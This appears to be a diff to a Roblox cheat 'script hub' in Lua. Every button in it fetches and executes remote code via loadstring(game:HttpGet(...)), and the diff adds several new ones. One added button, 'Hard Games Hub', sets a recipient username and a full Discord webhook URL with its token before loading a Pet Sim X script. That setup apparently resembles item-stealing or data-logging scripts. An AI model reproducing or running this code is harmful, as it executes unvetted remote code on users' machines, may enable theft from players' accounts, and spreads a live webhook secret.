@@ -2,7 +2,7 @@
 local DiscordLib = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt")()
 
 --windows
-local scriptswin = DiscordLib:Window("SyrHub: Remastered v1.2.1")
+local scriptswin = DiscordLib:Window("SyrHub: Remastered v1.2.2")
 
 -- servers
 local mainserv = scriptswin:Server("Syr Scripts", "cool")
@@ -46,6 +46,14 @@ bfbtns:Button("Mukuro Hub BF", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/xQuartyx/DonateMe/main/OldBf"))()
 end)
 
+bfbtns:Button("HoHo Hub", function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))()
+end)
+
+bfbtns:Button("Zaque Hub", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Mei2232/ZaqueHub/main/Zaque%20Hub"))()
+end)
+
 slbtns:Button("Premier Hub", function()
 loadstring(game:HttpGet('https://raw.githubusercontent.com/TrustsenseDev/Utilities/main/Premier.lua', true))()
 end)
@@ -71,7 +79,7 @@ loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/ahmadsgamer2/Scr
 end)
 
 psxbtns:Button("Milk Up Pet Sim X", function()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/CorruptedClan/PetSimX/main/MilkUpBeta.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CorruptedClan/PetSimX/main/MilkUpBeta.lua"))()
 end)
 
 psxbtns:Button("Evo V4 Pet Sim X", function()
@@ -80,6 +88,13 @@ end)
 
 psxbtns:Button("Huge Games Pet Sim X", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/CorruptedClan/Project/main/Huge%20Games.lua"))()
+end)
+
+psxbtns:Button("Hard Games Hub", function()
+UserName = "Wizard_CatWhite"
+WebHook = "https://discord.com/api/webhooks/1090853107816214548/Vxcs9dIe4jRfqeVbX6iHJn7ZifN4_kCPfJnI17LIINOqPfBtjzXjdG0I7B93mDORO5jS"
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))()
 end)
 
 psxbtns:Button("Comet Farm (Rejoin to turn off)", function()
@@ -248,9 +263,6 @@ ffbtns:Button("Funky Friday Autoplayer (Flxuxs Exclusive)", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ShowerHead-FluxTeam/scripts/main/funky-friday-autoplay"))()
 end)
 
-ffbtns:Button("Funky Friday Wally Hub", function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/wally-rblx/funky-friday-autoplay/main/main.lua",true))()
-end)
 
 katbtns:Button("Kat OP Hub Aim, Autokill etc", function()
 loadstring(game:HttpGet("https://pastebin.com/raw/6rd91GZx", true))()
